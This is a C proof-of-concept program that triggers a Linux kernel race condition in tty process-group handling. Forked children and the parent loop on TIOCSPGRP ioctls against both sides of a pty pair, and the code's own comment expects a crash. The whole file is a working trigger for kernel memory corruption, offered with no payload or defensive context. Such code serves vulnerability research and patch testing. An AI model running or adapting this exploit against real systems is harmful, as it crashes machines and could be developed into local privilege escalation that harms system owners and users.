#define _GNU_SOURCE
#include <err.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <termios.h>
#include <unistd.h>

int poc(void)
{
    sync(); /* we're probably gonna crash... */

    /*
     * We may already be process group leader but want to be session leader;
     * therefore, do everything in a child process.
     */
    pid_t main_task = fork();
    if (main_task == -1)
        err(1, "initial fork");
    if (main_task != 0) {
        int status;
        if (waitpid(main_task, &status, 0) != main_task)
            err(1, "waitpid main_task");
        return 0;
    }
    if (prctl(PR_SET_PDEATHSIG, SIGKILL))
        err(1, "PR_SET_PDEATHSIG");
    if (getppid() == 1)
        exit(0);

    /* basic preparation */
    if (signal(SIGTTOU, SIG_IGN))
        err(1, "signal");
    if (setsid() == -1)
        err(1, "start new session");

    /* set up a new pty pair */
    int ptmx = open("/dev/ptmx", O_RDWR);
    if (ptmx == -1)
        err(1, "open ptmx");
    unlockpt(ptmx);
    int tty = open(ptsname(ptmx), O_RDWR);
    if (tty == -1)
        err(1, "open tty");

    /*
     * Let a series of children change the ->pgrp pointer
     * protected by the tty's ctrl_lock...
     */
    pid_t child = fork();
    if (child == -1)
        err(1, "fork");
    if (child == 0) {
        if (prctl(PR_SET_PDEATHSIG, SIGKILL))
            err(1, "PR_SET_PDEATHSIG");
        if (getppid() == 1)
            exit(0);

        while (1) {
            pid_t grandchild = fork();
            if (grandchild == -1)
                err(1, "fork grandchild");
            if (grandchild == 0) {
                if (setpgid(0, 0))
                    err(1, "setpgid");
                int pgrp = getpid();
                if (ioctl(tty, TIOCSPGRP, &pgrp))
                    err(1, "TIOCSPGRP (tty)");
                exit(0);
            }
            int status;
            if (waitpid(grandchild, &status, 0) != grandchild)
                err(1, "waitpid for grandchild");
        }
    }

    /*
     * ... while the parent changes the same ->pgrp pointer under the
     * ctrl_lock of the other side of the pty pair.
     */
    while (1) {
        int pgrp = getpid();
        if (ioctl(ptmx, TIOCSPGRP, &pgrp))
            err(1, "TIOCSPGRP (ptmx)");
    }
}